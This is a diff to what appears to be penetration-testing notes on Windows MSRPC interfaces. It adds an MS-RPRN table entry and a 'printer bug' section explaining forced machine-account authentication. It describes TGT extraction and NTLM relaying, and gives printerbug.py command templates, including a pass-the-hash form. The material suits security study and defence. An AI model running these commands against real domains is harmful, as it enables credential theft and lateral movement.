@@ -78,12 +78,13 @@ installed services.
 | `12345778-1234-ABCD-EF00-0123456789AC` | `SAMR` | `Security Account Manager (SAM)` interface, that exposes the account database, both for local and remote domains. May be used to enumerate local and domain security principals (users and groups). |
 | `12345778-1234-ABCD-EF00-0123456789AB` | `LSARPC` | The `Local Security Authority (LSA)` interface, used to manage various machine and domain security policies, such as the rights and privileges that security principals have on the machine as well as the trust relationships between domains and forests. |
 | `3919286A-B10C-11D0-9BA8-00C04FD92EF5` | `LSARPC-DS` | The `LSA` `Directory Services Setup (DS)` interface, that exposes domain-related computer state and basic domain configuration information |
-| `1FF70682-0A51-30E8-076D-740BE8CEE98B`<br/>`378E52B0-C0A9-11CF-822D-00AA0051E40F`<br/>`86D35949-83C9-4044-B424-DB363231FD0C` | `ATSVC` | The `Task Scheduler` interface, that exposes scheduled tasks related functions. May be used to list existing tasks, query a configured task status, and configure or register tasks. |    
+| `12345678-1234-ABCD-EF00-0123456789AB` | `MS-RPRN` | The `Print System Remote Protocol` interface, which defines the communication of print job processing and print system management between a print client and a print server. Can be leveraged by any authenticated user to force the machine exposing the interface to connect, with its machine account, to a remote system. |
+| `1FF70682-0A51-30E8-076D-740BE8CEE98B`<br/>`378E52B0-C0A9-11CF-822D-00AA0051E40F`<br/>`86D35949-83C9-4044-B424-DB363231FD0C` | `ATSVC` | The `Task Scheduler` interface, that exposes scheduled tasks related functions. May be used to list existing tasks, query a configured task status, and configure or register tasks. |   
 | `367ABB81-9844-35F1-AD32-98F038001003` | `SVCCTL` | The `Service Control Manager (SCM)` interface, that enables remote configuration and control of Windows services. |
 | `4B324FC8-1670-01D3-1278-5A47BF6EE188` | `SRVSVC` | The `Server Service` interface, used for network shares related operations on the machine. |
 | `338CD001-2244-31F1-AAAA-900038001003` | `MSWINREG` | The `Windows Remote Registry` interface, used for remotely managing the Windows registry. |
 | `82273FDC-E32A-18C3-3F78-827929DC23EA` <br/> `F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C` | `EventLog` <br/> `EventLog version 6` | The `EventLog` interface, exposes functions to interact with the Windows event logs, such as retrieving reading events and general information, such as number of records, oldest records, etc, for a specified log hive. |
-| `50ABC2A4-574D-40B3-9D66-EE4FD5FBA076` | `DNSSERVER` | The `he Domain Name Service (DNS) Server Management` interface, exposed on Windows machines running DNS services, in order to allow remote access and administration capacities on the DNS component. |
+| `50ABC2A4-574D-40B3-9D66-EE4FD5FBA076` | `DNSSERVER` | The `Domain Name Service (DNS) Server Management` interface, exposed on Windows machines running DNS services, in order to allow remote access and administration capacities on the DNS component. |
 | `2F59A331-BF7D-48CB-9E5C-7C090D76E8B8` <br/> `5CA4A760-EBB1-11CF-8611-00A0245420ED` | `Terminal Server Service` <br/> `Terminal Services remote management` | `Terminal Server Service` (`termsrv.exe`) related interfaces, indicating that the terminal services have been deployed on the machine. |
 | `3F99B900-4D87-101B-99B7-AA0004007F07` | `MS-SQL-RPC` | `Microsoft SQL Server` related RPC interface. |
 | `82AD4280-036B-11CF-972C-00AA006887B0` | `Inetinfo`<br/>`MS-IIS-SMTP`<br/> | The `Internet Information Services (IIS)` `Inetinfo` interface, used to remotely manage `IIS` servers. |
@@ -217,4 +218,44 @@ walksam.exe <IP | HOSTNAME>
 
 python samrdump.py <IP | HOSTNAME>
 python samrdump.py [<DOMAIN>/]<USERNAME>:<PASSWORD>@<IP | HOSTNAME>
+```
+
+### MS-RPRN "printer bug"
+
+The `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the
+`Print System Remote Protocol`, exposed on the `MS-RPRN` `MSRPC` interface, can
+be called by any domain user, member of `Authenticated Users`, to force the
+machine running the `SpoolerService` to authenticate, through `NTLM` or
+`Kerberos`, to the specified remote system. The authentication is conducted by
+the machine using its machine account.
+
+The authentication received on a controlled system can be captured and
+exploited in a number of ways:
+  - If the controlled service account (user or computer account) receiving the
+  authentication is domain-joined and trusted for `Kerberos` `unconstrained
+  delegation`, the `Kerberos` `service ticket`, received from the targeted
+  machine as part of a `Kerberos` authentication, will contain a copy of the
+  machine `Ticket-Granting Ticket (TGT)`. This `TGT` can be extracted from the
+  `LSASS` process of the controlled machine, and futher used to authenticate to
+  any domain resources as the targeted machine account. For more information on
+  the attack, refer to the `[ActiveDirectory] Kerberos unconstrained
+  delegation` note.
+  - If the targeted machine account is member of the local `Administrators`
+  group of remote systems, the captured `NTLM` authentication can be relayed to
+  these systems. For more information, refer to the `[ActiveDirectory] NTLM
+  relaying` note. As a machine account password is robust, 120 `UTF16`
+  characters, and regularly rotated, 30 days by default, the `Net-NTLM` hash
+  cannot directly be cracked offline.
+
+The `printerbug.py` Python script, of the `krbrelayx` toolkit, can be used to
+call the `SpoolerService` `MSRPC` functions and trigger the authentication
+callback.
+
+```
+# In order to trigger a Kerberos authentication, the listening host <LHOST_HOSTNAME> should be associated to a Service Principal Names (SPN) in the domain and a valide DNS record
+# For more information, refer to the `[ActiveDirectory] Kerberos unconstrained delegation` note   
+
+printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>
+
+printerbug.py -hashes <LMHASH:NTHASH> [<DOMAIN>/]<USERNAME>@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>
 ```
